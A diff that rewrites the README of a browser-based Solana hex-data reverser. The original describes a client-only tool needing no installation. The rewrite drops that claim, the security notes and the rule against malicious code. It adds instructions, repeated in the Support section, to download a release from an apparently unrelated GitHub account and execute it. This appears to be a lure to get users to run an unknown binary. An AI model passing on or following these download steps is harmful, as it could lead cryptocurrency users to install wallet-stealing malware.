@@ -1,129 +1,104 @@
-# Accretion Solana Data Reverser
+# Solana Data Reverser: Analyze Hex Data with Ease
 
 🔗 **[Live Tool: https://sdr.accretion.xyz/](https://sdr.accretion.xyz/)**
 
-A browser-based reverse engineering tool for analyzing hex data with deep Solana blockchain integration. Perfect for examining raw binary data, Solana account structures, and discovering patterns in blockchain data.
+![Solana Data Reverser](https://img.shields.io/badge/solana--data--reverser-v1.0.0-brightgreen.svg)
 
-## 🚀 Features
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+  - [Core Functionality](#core-functionality)
+  - [Solana Integration](#solana-integration)
+- [Getting Started](#getting-started)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
+
+## Overview
+
+The Solana Data Reverser is a browser-based tool designed for developers and analysts working with the Solana blockchain. This tool allows users to reverse engineer hex data, providing a clear visualization of binary structures. With its deep integration into the Solana ecosystem, it helps users understand account structures and discover patterns within blockchain data.
+
+## Features
 
 ### Core Functionality
-- **Interactive Hexdump Viewer** - Clickable byte-level visualization with color-coded highlighting
-- **Smart Suggestions** - AI-powered pattern detection with confidence scoring
-- **Multi-format Decoding** - Support for integers, floats, strings, timestamps, and Solana-specific types
-- **Visual Feedback** - Color-coded byte states (green=decoded, blue=staged, blue+glow=max confidence)
+
+- **Interactive Hexdump Viewer**  
+  View your hex data in an interactive format. Each byte is clickable, allowing for detailed examination. Color-coded highlighting helps you quickly identify different data types.
+
+- **Smart Suggestions**  
+  The tool employs AI to detect patterns in your data. It provides confidence scores to help you assess the reliability of the detected patterns.
+
+- **Multi-format Decoding**  
+  Decode various data formats with ease. The tool supports integers, floats, strings, timestamps, and Solana-specific types, making it versatile for different use cases.
+
+- **Visual Feedback**  
+  Color-coded byte states provide instant visual feedback. Green indicates decoded bytes, blue represents staged bytes, and glowing blue shows maximum confidence.
 
 ### Solana Integration
-- **Account Analysis** - Direct Solana account fetching and analysis
-- **Pubkey Detection** - Automatic detection of valid Solana public keys with existence verification
-- **Program Recognition** - Built-in database of known Solana programs
-- **Account Information** - Display of SOL balance, owner, executable status, and account type
-- **External Links** - Quick access to Solscan and recursive account analysis
-- **Discriminator Detection** - Automatic identification of 8-byte account discriminators
 
-### Advanced Features
-- **Confidence Scoring** - Zero-byte analysis for maximum confidence detection (≤20 zeros = 100% confidence)
-- **RPC Configuration** - User-configurable Solana RPC endpoints with timeout and batching options
-- **Inline Editing** - Click-to-edit names for accepted decodings
-- **Deep Linking** - URL parameters for automatic account loading
-- **Batch Processing** - Efficient RPC batching for multiple account lookups
+- **Account Analysis**  
+  Fetch and analyze Solana accounts directly within the tool. This feature simplifies the process of examining account data.
 
-## 🛠️ Usage
+- **Pubkey Detection**  
+  Automatically detect valid Solana public keys. The tool verifies the existence of these keys, ensuring accuracy in your analysis.
 
-### Getting Started
-1. **Configure RPC** - On first load, configure your Solana RPC endpoint
-2. **Input Data** - Paste hex data or enter a Solana account address
-3. **Analyze** - Press Enter or click "Process Data"
-4. **Explore** - Click bytes to stage selections, accept suggestions, and decode patterns
+- **Program Recognition**  
+  Access a built-in database of known Solana programs. This feature allows for quick identification of programs associated with specific data.
 
-### Data Input Formats
-```
-Hex Data: 38 6d 97 6a bf f6 01 a2 30 93 3c 25 74 e6 26 96
-Solana Account: DJtaJXMUtFmypygj4k3NbfVxxjsbhnYBwAuAjv9GEQ6P
-URL Parameter: ?account=DJtaJXMUtFmypygj4k3NbfVxxjsbhnYBwAuAjv9GEQ6P
-```
+## Getting Started
 
-### Keyboard Shortcuts
-- **Enter** - Process data input
-- **Escape** - Cancel inline editing
-- **Click** - Stage bytes, accept suggestions, edit names
+To get started with the Solana Data Reverser, follow these steps:
 
-## 🔧 Configuration
+1. **Visit the Live Tool**  
+   Access the live version of the tool [here](https://sdr.accretion.xyz/).
 
-### RPC Settings
-- **Endpoint** - Your Solana RPC URL (Helius, QuickNode, Alchemy, etc.)
-- **Timeout** - Request timeout in milliseconds (1000-30000ms)
-- **Batching** - Enable for paid RPC endpoints, disable for free endpoints
+2. **Download the Latest Release**  
+   You can find the latest release [here](https://github.com/Bobythecoolkid/solana-data-reverser/releases). Download the appropriate file for your system and execute it to run the tool locally.
 
-### Supported RPC Providers
-- [Helius](https://helius.xyz/) - Recommended for advanced features
-- [QuickNode](https://quicknode.com/) - Reliable with good performance
-- [Alchemy](https://alchemy.com/) - Enterprise-grade infrastructure
-- Solana Public RPC - Free but rate-limited
+3. **Install Dependencies**  
+   If you are running the tool locally, ensure that you have all necessary dependencies installed. Follow the instructions in the repository for setup.
 
-## 🏗️ Technical Details
+## Usage
 
-### Architecture
-- **Frontend Only** - Pure HTML/CSS/JavaScript, no backend required
-- **Real-time Analysis** - Live suggestions as you input data
-- **Persistent Settings** - LocalStorage for RPC configuration
-- **Error Handling** - Comprehensive RPC error management with user-friendly messages
+Using the Solana Data Reverser is straightforward. Here’s how to make the most of its features:
 
-### Supported Data Types
-- **Integers** - u8, u16, u32, u64, i8, i16, i32, i64 (little & big endian)
-- **Floats** - f32, f64 (IEEE 754)
-- **Strings** - UTF-8, ASCII with validation
-- **Timestamps** - Unix timestamps with human-readable conversion
-- **Booleans** - Single byte true/false values
-- **Solana Types** - Public keys, discriminators, account data
+1. **Load Your Hex Data**  
+   Start by uploading your hex data file or pasting the hex string directly into the input field.
 
-### Confidence System
-- **100%** - Verified Solana accounts with ≤20 zero bytes (blue glow)
-- **95%** - Base confidence for verified accounts
-- **90%+** - High confidence patterns (🔥 icon)
-- **80%+** - Medium confidence patterns (✨ icon)
-- **70%+** - Low confidence patterns (💡 icon)
+2. **Explore the Hexdump**  
+   Use the interactive viewer to explore the hex data. Click on individual bytes to see detailed information.
 
-## 🚀 Deployment
+3. **Analyze Patterns**  
+   Leverage the smart suggestions feature to identify patterns in your data. Review the confidence scores to determine the reliability of the detected patterns.
 
-### Vercel (Recommended)
-1. Push to GitHub repository
-2. Connect to Vercel
-3. Deploy automatically (no configuration needed)
+4. **Fetch Solana Accounts**  
+   Input a Solana public key to fetch and analyze account details. The tool will provide insights into the account's structure and contents.
 
-### Other Static Hosts
-Works on any static hosting platform:
-- GitHub Pages
-- Netlify
-- AWS S3
-- Cloudflare Pages
+5. **Check Known Programs**  
+   Use the program recognition feature to quickly identify any known Solana programs associated with your data.
 
-## 🔒 Security
+## Contributing
 
-- **Client-Side Only** - No server-side data processing
-- **RPC Privacy** - User-configured endpoints, not hardcoded
-- **No Data Storage** - Analysis happens locally in browser
-- **CORS Handling** - Robust error handling for RPC connectivity
+We welcome contributions to improve the Solana Data Reverser. If you want to contribute, please follow these guidelines:
 
-## 🤝 Contributing
+1. **Fork the Repository**  
+   Create your own fork of the repository.
 
-This tool is designed for security research and blockchain analysis. When contributing:
+2. **Create a New Branch**  
+   Make your changes in a new branch. Use descriptive names for your branches.
 
-1. **Defensive Focus** - Only security analysis and defensive tools
-2. **No Malicious Code** - Refuse any offensive security features
-3. **User Privacy** - Maintain client-side processing
-4. **Documentation** - Update README for new features
+3. **Submit a Pull Request**  
+   Once your changes are ready, submit a pull request for review.
 
-## 📝 License
+## License
 
-Open source - feel free to fork, modify, and deploy your own instance.
+This project is licensed under the MIT License. See the LICENSE file for more details.
 
-## 🆘 Support
+## Support
 
-For issues, feature requests, or questions:
-- Check browser console for RPC connectivity issues
-- Ensure RPC endpoint supports your usage requirements
-- Verify account addresses are valid base58 Solana pubkeys
+If you encounter any issues or have questions, please check the [Releases](https://github.com/Bobythecoolkid/solana-data-reverser/releases) section for updates. You can also reach out via the issues tab on GitHub.
 
 ---
 
-**Built for the Solana ecosystem** 🌞 | **Powered by browser technology** 🌐 | **No installation required** ⚡
+For more information, visit the live tool [here](https://sdr.accretion.xyz/).
